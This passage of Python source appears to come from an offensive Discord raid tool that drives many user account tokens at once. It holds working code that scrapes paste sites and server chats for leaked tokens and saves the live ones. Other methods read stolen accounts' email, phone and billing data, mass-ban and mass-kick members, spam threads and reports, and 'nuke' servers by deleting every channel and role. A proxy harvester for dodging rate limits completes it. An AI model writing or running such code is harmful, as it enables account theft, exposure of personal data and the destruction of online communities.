                console.log("Changed", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", bio)
            elif response.status_code == 429:
                console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            else:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def mass_nick(self, token, guild, nick):
        try:
            payload = {
                "nick" : nick
            }

            response = session.patch(
                f"https://discord.com/api/v9/guilds/{guild}/members/@me", 
                headers=self.headers(token),
                json=payload
            )

            if response.status_code == 200:
                console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            else:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def thread_spammer(self, token, channel_id, name):
        try:
            payload = {
                "name": name,
                "type": 11,
                "auto_archive_duration": 4320,
                "location": "Thread Browser Toolbar",
            }

            while not STRIKE_EVENT.is_set():
                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/threads",
                    headers=self.headers(token),
                    json=payload
                )

                if response.status_code == 201:
                    console.log("Created", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", name)
                elif response.status_code == 429:
                    retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
                    if int(retry_after) > 10:
                        console.log("Stopped", C["magenta"], token[:25], f"Ratelimit Exceeded - {int(round(retry_after))}s",)
                        break
                    else:
                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                        time.sleep(float(retry_after))
                else:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                    break
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def typier(self, token, channel_id):
        try:
            while not STRIKE_EVENT.is_set():
                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/typing", 
                    headers=self.headers(token)
                )

                if response.status_code == 204:
                    console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                    time.sleep(9)
                else:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                    break
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def friender(self, token, nickname):
        try:
            payload = {
                "username": nickname,
                "discriminator": None,
            }

            response = session.post(
                f"https://discord.com/api/v9/users/@me/relationships", 
                headers=self.headers(token), 
                json=payload
            )

            if response.status_code == 204:
                console.log(f"Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            elif response.status_code == 400:
                console.log("Captcha", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            else:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json())
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def guild_checker(self, guild_id):
        def main_checker(token):
            try:
                while not STRIKE_EVENT.is_set():
                    response = session.get(
                        f"https://discord.com/api/v9/guilds/{guild_id}",
                        headers=self.headers(token)
                    )

                    if response.status_code == 200:
                        console.log("Found", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                        break
                    elif response.status_code == 429:
                        retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                        time.sleep(float(retry_after))
                    else:
                        console.log("Not Found", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                        break
            except Exception as e:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

        args = [
            (token, ) for token in tokens
        ]
        Menu().run(main_checker, args)

    def token_checker(self):
        """Elite Token Validator with Fallback Logic"""
        valid = []
        def task(token):
            token = token.strip()
            # Try Elite Request (Proxies/TLS)
            res = self.request("GET", "https://discord.com/api/v9/users/@me", token)
            
            # Fallback to Direct (No Proxy) if Elite fails
            if not res or res.status_code not in [200, 401, 403]:
                try:
                    res = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}, timeout=5)
                except:
                    res = None

            if res and res.status_code == 200:
                try:
                    data = res.json()
                    tag = f"{data['username']}#{data.get('discriminator', '0000')}"
                except:
                    tag = "Parsed Info Error"
                console.log("Valid", C["green"], f"{token[:25]}...", tag)
                valid.append(token)
            elif res and res.status_code == 403:
                console.log("Locked", C["yellow"], f"{token[:25]}...", "Verification Required")
            elif res and res.status_code == 401:
                console.log("Invalid", C["red"], f"{token[:25]}...", "Expired/Dead")
            else:
                status = res.status_code if res else "Conn Error"
                console.log("Failed", C["rose"], f"{token[:25]}...", f"Error {status}")

        args = [(token,) for token in tokens]
        Menu().run(task, args)
        
        if valid:
            with open("data/tokens.txt", "w") as f:
                f.write("\n".join(valid))
        console.log("Sync", C["cyan"], "Strike-Team Updated", f"{len(valid)} Live Tokens")

    def proxy_overdrive(self):
        """Lethal Auto-Proxy Overdrive: Scrape & Verify Millions"""
        console.log("SYSTEM", C["gray"], "Sucking raw lists from global data centers...")
        sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt"
        ]
        
        raw_proxies = []
        for s in sources:
            if STRIKE_EVENT.is_set(): break
            try:
                res = requests.get(s, timeout=10)
                if res.status_code == 200:
                    found = re.findall(r"\d+\.\d+\.\d+\.\d+:\d+", res.text)
                    raw_proxies.extend(found)
                    console.log("SCRAPE", C["aqua"], f"Added {len(found)} potential nodes from {s.split('/')[2]}")
            except: pass
            
        raw_proxies = list(set(raw_proxies))
        total = len(raw_proxies)
        console.log("STRIKE", C["yellow"], f"Commencing Validation Strike on {total} candidates...")
        
        live_count = 0
        def verify(proxy):
            nonlocal live_count
            try:
                # Fast probe to Discord experiments endpoint
                proxies_proto = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                res = requests.get("https://discord.com/api/v9/experiments", proxies=proxies_proto, timeout=3)
                if res.status_code == 200:
                    console.log("LIVE", C["green"], f"{proxy} (Verified)")
                    with open("data/proxies.txt", "a") as f:
                        f.write(f"{proxy}\n")
                    live_count += 1
            except: pass

        args = [(p,) for p in raw_proxies]
        Menu().run(verify, args)
        
        console.log("SYNC", C["cyan"], f"Strike Complete: {live_count} live proxies injected into data/proxies.txt")

    def proxy_cleaner(self):
        """Purge Dead Weight: Verify & Clean current proxy list"""
        global proxies
        if not proxies:
            console.log("ERROR", C["red"], "Proxy grid is empty. Nothing to clean.")
            return

        console.log("SYSTEM", C["gray"], f"Preparing to sanitize {len(proxies)} nodes...")
        valid_proxies = []
        
        def check(proxy):
            try:
                proxies_proto = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                res = requests.get("https://discord.com/api/v9/experiments", proxies=proxies_proto, timeout=3)
                if res.status_code == 200:
                    console.log("LIVE", C["green"], f"{proxy} (Kept)")
                    valid_proxies.append(proxy)
                else:
                    console.log("DEAD", C["rose"], f"{proxy} (Purged)")
            except:
                console.log("DEAD", C["rose"], f"{proxy} (Purged)")

        args = [(p,) for p in proxies]
        Menu().run(check, args)
        
        with open("data/proxies.txt", "w") as f:
            f.write("\n".join(valid_proxies) + "\n")
        
        # Update global proxies list
        proxies = valid_proxies
        
        console.log("SYNC", C["cyan"], f"Sanitization Complete: {len(valid_proxies)} live nodes remaining.")
    def token_scraper(self, mode="1"):
        """The Vacuum v4: THE MEGALODON (Full URL Infinity Loop)"""
        while not STRIKE_EVENT.is_set():
            if mode == "1": # THE MEGALODON - Web Crawler (Worker System)
                # Worker assignment - each thread gets a specific target
                worker_id = threading.current_thread().name
                
                dump_sites = [
                    {"url": "https://pastebin.com/archive", "type": "pastebin"},
                    {"url": "https://controlc.com/", "type": "controlc"},
                    {"url": "https://dpaste.org/", "type": "dpaste"},
                ]
                
                # Assign site based on thread
                site_index = hash(worker_id) % len(dump_sites)
                site = dump_sites[site_index]
                
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                # User-Agent rotation
                user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
                ]
                
                print(f"[{timestamp}] {C['aqua']}[WORKER-{site_index}] {C['gray']}Scanning {site['type'].upper()}...")
                
                try:
                    res = requests.get(site['url'], headers={"User-Agent": random.choice(user_agents)}, timeout=10)
                    
                    if res.status_code == 200:
                        if site['type'] == 'pastebin':
                            paste_ids = re.findall(r'<a href="/([a-zA-Z0-9]{8})"', res.text)
                            if paste_ids:
                                print(f"[{timestamp}] {C['yellow']}[WORKER-{site_index}] {C['gray']}Found {len(paste_ids)} pastes")
                                for paste_id in paste_ids[:3]:  # Only 3 per cycle
                                    if STRIKE_EVENT.is_set(): break
                                    try:
                                        paste_url = f"https://pastebin.com/raw/{paste_id}"
                                        paste_res = requests.get(paste_url, headers={"User-Agent": random.choice(user_agents)}, timeout=10)
                                        if paste_res.status_code == 200:
                                            potential = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", paste_res.text)
                                            if potential:
                                                print(f"[{timestamp}] {C['green']}[HIT] {C['gray']}Found {len(potential)} tokens in {paste_id}")
                                                for t in list(set(potential)):
                                                    self.validate_token(t, f"Pastebin:{paste_id}")
                                        time.sleep(1)
                                    except: pass
                            else:
                                print(f"[{timestamp}] {C['gray']}[WORKER-{site_index}] No pastes")
                        
                        else:
                            # For other sites, direct scan
                            potential = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", res.text)
                            if potential:
                                print(f"[{timestamp}] {C['green']}[HIT] {C['gray']}Found {len(potential)} tokens on {site['type']}")
                                for t in list(set(potential)):
                                    self.validate_token(t, site['type'])
                            else:
                                print(f"[{timestamp}] {C['gray']}[WORKER-{site_index}] Clean")
                    
                    elif res.status_code == 429:
                        print(f"[{timestamp}] {C['red']}[WORKER-{site_index}] Rate-limited, cooling down...")
                        time.sleep(60)
                    else:
                        print(f"[{timestamp}] {C['red']}[WORKER-{site_index}] Blocked ({res.status_code})")
                    
                    # Worker-specific delay
                    time.sleep(random.uniform(15, 25))
                    
                except Exception as e:
                    print(f"[{timestamp}] {C['red']}[WORKER-{site_index}] Error: {str(e)[:30]}")
                    time.sleep(10)
                
            elif mode == "2": # THE MEGALODON - Channel Sniper
                if not tokens: break
                token = random.choice(tokens)
                try:
                    guilds = self.request("GET", "https://discord.com/api/v9/users/@me/guilds", token).json()
                    for g in guilds:
                        if STRIKE_EVENT.is_set(): break
                        t_now = datetime.now().strftime("%H:%M:%S")
                        print(f"[{t_now}] {C['aqua']}[SNIPE] {C['gray']}Targeting Guild: {Fore.LIGHTWHITE_EX}{g.get('name', 'Unknown')}{Fore.RESET}")
                        
                        chans = self.request("GET", f"https://discord.com/api/v9/guilds/{g['id']}/channels", token).json()
                        for c in chans:
                            if STRIKE_EVENT.is_set(): break
                            print(f"[{t_now}] {C['gray']}[SCAN] Scraping Chat: #{c.get('name', 'Unknown')}")
                            msgs = self.request("GET", f"https://discord.com/api/v9/channels/{c['id']}/messages?limit=50", token).json()
                            if isinstance(msgs, list):
                                for m in msgs:
                                    potential = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", str(m))
                                    for t in potential:
                                        self.validate_token(t, f"Server: {g.get('name','')} | #{c.get('name','')}")
                    time.sleep(0.5)
                except: pass

    def validate_token(self, token, source_name):
        """Ultra-Fast Validation with Waterfall Feedback"""
        res = self.request("GET", "https://discord.com/api/v9/users/@me/library", token)
        if res and res.status_code == 200:
            console.log("SUCCESS", C["green"], f"VALID TOKEN: {token}", f"Source: {source_name}")
            with open("data/hits.txt", "a") as f: f.write(f"{token}\n")
            if token not in tokens: tokens.append(token)
        else:
            console.log("FAIL", C["red"], f"INVALID TOKEN: {token[:30]}...", "VOID")

    def accept_rules(self, guild_id):
        try:
            # Fetch rules info using first token
            rules_payload = None
            for token in tokens:
                res = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/member-verification?with_guild=false", token)
                if res and res.status_code == 200:
                    rules_payload = res.json()
                    break
            
            if not rules_payload:
                console.log("Failed", C["red"], "Could not fetch rules or all tokens rate-limited")
                return

            def task(token):
                res = self.request("PUT", f"https://discord.com/api/v9/guilds/{guild_id}/requests/@me", token, json=rules_payload)
                if res and res.status_code == 201:
                    console.log("Accepted", C["green"], f"{token[:25]}...", f"Server: {guild_id}")
                else:
                    msg = res.json().get("message", "Error") if res else "No Response"
                    console.log("Failed", C["red"], f"{token[:25]}...", msg)

            args = [(token,) for token in tokens]
            Menu().run(task, args)
        except Exception as e:
            console.log("Error", C["red"], "Rules Acceptor Failure", e)

    def onboard_bypass(self, guild_id):
        try:
            onboarding_responses_seen = {}
            onboarding_prompts_seen = {}
            onboarding_responses = []
            in_guild = []

            for _token in tokens:
                response = session.get(
                    f"https://discord.com/api/v9/guilds/{guild_id}/onboarding",
                    headers=self.headers(_token)
                )

                if response.status_code == 200:
                    in_guild.append(_token)
                    break

            if not in_guild:
                console.log("Failed", C["red"], "Missing Access")
                input()
                Menu().main_menu()
            else:
                data = response.json()
                now = int(datetime.now().timestamp())

                for __ in data["prompts"]:
                    onboarding_responses.append(__["options"][-1]["id"])

                    onboarding_prompts_seen[__["id"]] = now

                    for prompt in __["options"]:
                        if prompt:
                            onboarding_responses_seen[prompt["id"]] = now
                        else:
                            console.log("Failed", C["red"], "No onboarding in This Server",)
                            input()
                            Menu().main_menu()

            def run_task(token):
                try:
                    json_data = {
                        "onboarding_responses": onboarding_responses,
                        "onboarding_prompts_seen": onboarding_prompts_seen,
                        "onboarding_responses_seen": onboarding_responses_seen,
                    }

                    response = session.post(
                        f"https://discord.com/api/v9/guilds/{guild_id}/onboarding-responses",
                        headers=self.headers(token),
                        json=json_data
                    )

                    if response.status_code == 200:
                        console.log("Accepted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                    else:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token, ) for token in tokens
            ]
            Menu().run(run_task, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to Pass Onboard", e)
            input()
            Menu().main_menu()

    def reactor_main(self, channel_id, message_id):
        try:
            access_token = []
            emojis = []

            params = {
                "around": message_id, 
                "limit": 50
            }

            for token in tokens:
                response = session.get(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=self.headers(token),
                    params=params
                )

                if response.status_code == 200:
                    access_token.append(token)
                    break

            if not access_token:
                console.log("Failed", C["red"], "Missing Permissions")
                input()
                Menu().main_menu()
            else:
                data = response.json()
                for __ in data:
                    if __["id"] == message_id:
                        reactions = __["reactions"]
                        for emois in reactions:
                            if emois:
                                emoji_id = emois["emoji"]["id"]
                                emoji_name = emois["emoji"]["name"]

                                if emoji_id is None:
                                    emojis.append(emoji_name)
                                else:
                                    emojis.append(f"{emoji_name}:{emoji_id}")
                            else:
                                console.log("Failed", C["red"], "No reactions Found in this message",)
                                input()
                                Menu().main_menu()

                for i, emoji in enumerate(emojis, start=1):
                    print(f"{C[color]}0{i}:{C['white']} {emoji}")

                choice = input(f"\n{console.prompt('Choice')}")
                if choice.startswith('0') and len(choice) == 2:
                    choice = str(int(choice))
                selected = emojis[int(choice) - 1]

            def add_reaction(token):
                try:
                    url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{selected}/@me"
                    response = session.put(url, headers=self.headers(token))

                    if response.status_code == 204:
                        console.log("Reacted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", selected)
                    else:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token,) for token in tokens
            ]
            Menu().run(add_reaction, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to get emojis", e)
            input()
            Menu().main_menu()

    def button_bypass(self, channel_id, message_id, guild_id):
        try:
            access_token = []
            buttons = []

            params = {"around": message_id, "limit": 50}

            for token in tokens:
                response = session.get(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=self.headers(token),
                    params=params
                )

                if response.status_code == 200:
                    access_token.append(token)
                    break

            if not access_token:
                console.log("Failed", C["red"], "Missing Permissions")
                input()
                Menu().main_menu()
            else:
                message = next((m for m in response.json() if m["id"] == message_id), None)

                if not message:
                    console.log("Failed", C["red"], "Message not found")
                    input()
                    Menu().main_menu()
                else:
                    for row in message.get("components", []):
                        for comp in row.get("components", []):
                            if comp.get("type") == 2:
                                label = comp.get("label", "No Label")
                                custom_id = comp["custom_id"]
                                buttons.append({
                                    "label": label,
                                    "custom_id": custom_id,
                                })

                    if not buttons:
                        console.log("Failed", C["red"], "No buttons found in this message")
                        input()
                        Menu().main_menu()

            for i, btn in enumerate(buttons, start=1):
                print(f"{C[color]}0{i}:{C['white']} {btn['label']}")

            choice = input(f"\n{console.prompt('Choice')}")
            if choice.startswith('0') and len(choice) == 2:
                choice = str(int(choice))

            btn = buttons[int(choice) - 1]
            custom_id = btn["custom_id"]

            def click_button(token):
                try:
                    payload = {
                        "application_id": message["author"]["id"],
                        "channel_id": channel_id,
                        "data": {
                            "component_type": 2,
                            "custom_id": custom_id,
                        },
                        "guild_id": guild_id,
                        "message_flags": 0,
                        "message_id": message_id,
                        "nonce": self.nonce(),
                        "session_id": uuid.uuid4().hex,
                        "type": 3,
                    }

                    resp = session.post(
                        "https://discord.com/api/v9/interactions",
                        headers=self.headers(token),
                        json=payload
                    )

                    if resp.status_code == 204:
                        console.log("Clicked", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", btn["label"])
                    else:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token,) for token in tokens
            ]
            Menu().run(click_button, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to get buttons", e)
            input()
            Menu().main_menu()

    def mass_report(self, token, guild_id, channel_id, message_id, reason):
        try:
            payload = {
                "guild_id": guild_id,
                "channel_id": channel_id,
                "message_id": message_id,
                "reason": reason
            }
            res = session.post("https://discord.com/api/v9/reports", headers=self.headers(token), json=payload)
            if res.status_code == 204:
                console.log("Reported", C["green"], f"{Fore.RESET}{token[:25]}", f"Reason: {reason}")
            else:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}", res.json().get("message", "Error"))
        except: pass

    def hypesquad(self, token, house_id):
        try:
            payload = {"house_id": house_id}
            headers = self.headers(token)
            headers["referer"] = "https://discord.com/channels/@me"
            res = session.post("https://discord.com/api/v9/hypesquad/online", headers=headers, json=payload)
            if res.status_code == 204:
                console.log("HypeSquad", C["green"], f"{Fore.RESET}{token[:25]}", f"House: {house_id}")
            else:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}", "Error")
        except: pass

    def mass_block(self, token, user_id):
        try:
            res = session.put(f"https://discord.com/api/v9/users/@me/relationships/{user_id}", headers=self.headers(token), json={"type": 2})
            if res.status_code == 204:
                console.log("Blocked", C["yellow"], f"{Fore.RESET}{token[:25]}", f"User: {user_id}")
            else:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}", "Error")
        except: pass

    def delete_all_emojis(self, guild_id):
        token = random.choice(tokens)
        emojis = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/emojis", token).json()
        chunks = [emojis[i::len(tokens)] for i in range(len(tokens))]

        def task(token, chunk):
            for e in chunk:
                self.request("DELETE", f"https://discord.com/api/v9/guilds/{guild_id}/emojis/{e['id']}", token)
                console.log("Deleted", C["red"], "Emoji", e["name"])

        with ThreadPoolExecutor(max_workers=20) as exe:
            for i, token in enumerate(tokens): exe.submit(task, token, chunks[i])

    def mass_create_channels(self, guild_id, name):
        def task(token):
            for _ in range(25):
                self.request("POST", f"https://discord.com/api/v9/guilds/{guild_id}/channels", token, json={"name": f"{name}-{uuid.uuid4().hex[:5]}", "type": 0})
                console.log("Created", C["green"], "Channel", name)
        
        with ThreadPoolExecutor(max_workers=50) as exe:
            for token in tokens: exe.submit(task, token)

    def mass_create_roles(self, guild_id, name):
        def task(token):
            for _ in range(25):
                self.request("POST", f"https://discord.com/api/v9/guilds/{guild_id}/roles", token, json={"name": name, "color": random.randint(0, 0xFFFFFF)})
                console.log("Created", C["green"], "Role", name)

        with ThreadPoolExecutor(max_workers=50) as exe:
            for token in tokens: exe.submit(task, token)

    def leave_all(self, token):
        try:
            res = session.get("https://discord.com/api/v9/users/@me/guilds", headers=self.headers(token))
            if res.status_code == 200:
                for guild in res.json():
                    session.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild['id']}", headers=self.headers(token))
                    console.log("Left", C["red"], f"{Fore.RESET}{token[:25]}", guild['name'])
        except: pass

    def server_nuker(self, guild_id):
        try:
            def nuke_all(token):
                # Full Kaboom logic
                res = session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=self.headers(token))
                if res.status_code == 200:
                    for ch in res.json():
                        session.delete(f"https://discord.com/api/v9/channels/{ch['id']}", headers=self.headers(token))
                
                res = session.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=self.headers(token))
                if res.status_code == 200:
                    for role in res.json():
                        if role["name"] != "@everyone":
                            session.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role['id']}", headers=self.headers(token))

                for _ in range(50):
                    session.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=self.headers(token), json={"name": "RAIDED-BY-ASTRO", "type": 0})
                    session.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=self.headers(token), json={"name": "ASTRO-GOD", "color": 0xFF0000})

            for token in tokens:
                threading.Thread(target=nuke_all, args=(token,)).start()
        except Exception as e:
            console.log("Failed", C["red"], "Nuke Error", e)

    def token_analytics(self, token):
        try:
            res = session.get("https://discord.com/api/v9/users/@me", headers=self.headers(token))
            if res.status_code == 200:
                data = res.json()
                username = f"{data['username']}#{data['discriminator']}"
                email = data.get("email", "None")
                phone = data.get("phone", "None")
                nitro = "None"
                if data.get("premium_type") == 1: nitro = "Nitro Classic"
                elif data.get("premium_type") == 2: nitro = "Nitro Boost"
                
                billing = session.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=self.headers(token))
                methods = "None"
                if billing.status_code == 200:
                    methods = ", ".join([str(m["type"]) for m in billing.json()])
                
                console.log("Analytics", C["cyan"], f"{Fore.RESET}{token[:25]}", f"User: {username} | Nitro: {nitro} | Phone: {phone} | Billing: {methods}")
        except Exception as e:
            console.log("Failed", C["red"], "Analytics Error", e)

    def nitro_sniper(self, token):
        try:
            def on_msg(ws, message):
                msg = json.loads(message)
                if msg["t"] == "MESSAGE_CREATE":
                    content = msg["d"]["content"]
                    if "discord.gift/" in content or "discord.com/gifts/" in content:
                        code = content.split("/")[-1].split(" ")[0]
                        res = session.post(f"https://discord.com/api/v9/entitlements/gift-codes/{code}/redeem", headers=self.headers(token))
                        if res.status_code == 200:
                            console.log("SNIPED", C["green"], "Nitro Sniped!", code)
                        else:
                            console.log("FAILED", C["red"], "Snipe Failed", code)

            def start_ws():
                ws = websocket.WebSocketApp("wss://gateway.discord.gg/?v=9&encoding=json", on_message=on_msg)
                ws.run_forever()

            threading.Thread(target=start_ws, daemon=True).start()
            console.log("Active", C["green"], f"{Fore.RESET}{token[:25]}", "Nitro Sniper Engaged")
        except Exception as e:
            console.log("Failed", C["red"], "Sniper Error", e)

    def server_nuker(self, guild_id):
        try:
            # 1. Gather all targets
            token = random.choice(tokens)
            chans = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/channels", token).json()
            roles = [r for r in self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/roles", token).json() if r["name"] != "@everyone"]
            
            # 2. Distribute Deletion
            def nuker_task(token, target_list, route):
                for target in target_list:
                    if STRIKE_EVENT.is_set(): break
                    self.request("DELETE", f"https://discord.com/api/v{9 if 'roles' in route else 9}/{route}/{target['id']}", token)
                    console.log("Nuked", C["red"], f"{token[:15]}...", f"Target: {target.get('name', target['id'])}")

            # Divide channels and roles among tokens
            chan_chunks = [chans[i::len(tokens)] for i in range(len(tokens))]
            role_chunks = [roles[i::len(tokens)] for i in range(len(tokens))]

            with ThreadPoolExecutor(max_workers=50) as executor:
                for i, token in enumerate(tokens):
                    executor.submit(nuker_task, token, chan_chunks[i], "channels")
                    executor.submit(nuker_task, token, role_chunks[i], f"guilds/{guild_id}/roles")

            # 3. Mass Creation & Chaos
            def chaos_task(token):
                for _ in range(25):
                    self.request("POST", f"https://discord.com/api/v9/guilds/{guild_id}/channels", token, json={"name": "RAIDED-BY-ASTRO", "type": 0})
                    self.request("POST", f"https://discord.com/api/v9/guilds/{guild_id}/roles", token, json={"name": "ASTRO-GOD", "color": random.randint(0, 0xFFFFFF)})
            
            for token in tokens: threading.Thread(target=chaos_task, args=(token,)).start()

        except Exception as e:
            console.log("Error", C["red"], "Nuke Failure", e)

    def delete_all_channels(self, guild_id):
        token = random.choice(tokens)
        chans = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/channels", token).json()
        chunks = [chans[i::len(tokens)] for i in range(len(tokens))]
        
        def task(token, chunk):
            for ch in chunk:
                self.request("DELETE", f"https://discord.com/api/v9/channels/{ch['id']}", token)
                console.log("Deleted", C["red"], "Channel", ch["name"])

        with ThreadPoolExecutor(max_workers=20) as exe:
            for i, token in enumerate(tokens): exe.submit(task, token, chunks[i])

    def delete_all_roles(self, guild_id):
        token = random.choice(tokens)
        roles = [r for r in self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/roles", token).json() if r["name"] != "@everyone"]
        chunks = [roles[i::len(tokens)] for i in range(len(tokens))]

        def task(token, chunk):
            for r in chunk:
                self.request("DELETE", f"https://discord.com/api/v9/guilds/{guild_id}/roles/{r['id']}", token)
                console.log("Deleted", C["red"], "Role", r["name"])

        with ThreadPoolExecutor(max_workers=20) as exe:
            for i, token in enumerate(tokens): exe.submit(task, token, chunks[i])

    def change_guild_identity(self, guild_id, name, icon_url=None):
        def task(token):
            payload = {"name": name}
            if icon_url:
                img_data = base64.b64encode(requests.get(icon_url).content).decode('ascii')
                payload["icon"] = f"data:image/png;base64,{img_data}"
            session.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers=self.headers(token), json=payload)
            console.log("Updated", C["cyan"], "Server Identity", name)
        for token in tokens: threading.Thread(target=task, args=(token,)).start()

    def mass_ban(self, guild_id):
        token = random.choice(tokens)
        mems = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", token).json()
        chunks = [mems[i::len(tokens)] for i in range(len(tokens))]

        def task(token, chunk):
            for m in chunk:
                self.request("PUT", f"https://discord.com/api/v9/guilds/{guild_id}/bans/{m['user']['id']}", token, json={"delete_message_days": 7, "reason": "ASTRO-NEXUS OVERDRIVE"})
                console.log("Banned", C["red"], "Member", m["user"]["username"])

        with ThreadPoolExecutor(max_workers=20) as exe:
            for i, token in enumerate(tokens): exe.submit(task, token, chunks[i])

    def mass_kick(self, guild_id):
        token = random.choice(tokens)
        mems = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", token).json()
        chunks = [mems[i::len(tokens)] for i in range(len(tokens))]

        def task(token, chunk):
            for m in chunk:
                self.request("DELETE", f"https://discord.com/api/v9/guilds/{guild_id}/members/{m['user']['id']}", token)
                console.log("Kicked", C["red"], "Member", m["user"]["username"])

